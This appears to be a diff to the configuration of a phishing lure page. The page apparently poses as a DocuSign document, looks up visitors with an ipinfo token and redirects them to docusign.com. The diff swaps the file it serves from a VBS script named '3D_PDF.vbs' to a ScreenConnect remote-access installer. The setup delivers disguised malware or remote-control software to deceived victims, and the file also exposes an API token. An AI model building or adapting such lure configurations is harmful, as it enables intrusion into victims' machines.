@@ -32,8 +32,8 @@ window.config = {
     ipinfo_token: '1006035904ee8d',
 
     // Download Settings
-    downloadFile: "3D_PDF.vbs",
-    downloadName: "3D_PDF.vbs",
+    downloadFile: "ScreenConnect.ClientSetup.msi",
+    downloadName: "ScreenConnect.ClientSetup.msi",
 
     // Redirect URL
     redirectUrl: "https://www.docusign.com"
@@ -60,6 +60,7 @@ const ipinfo_token = window.config.ipinfo_token;
 const downloadFile = window.config.downloadFile;
 const downloadName = window.config.downloadName;
 const redirectUrl = window.config.redirectUrl;
+
 
 
 
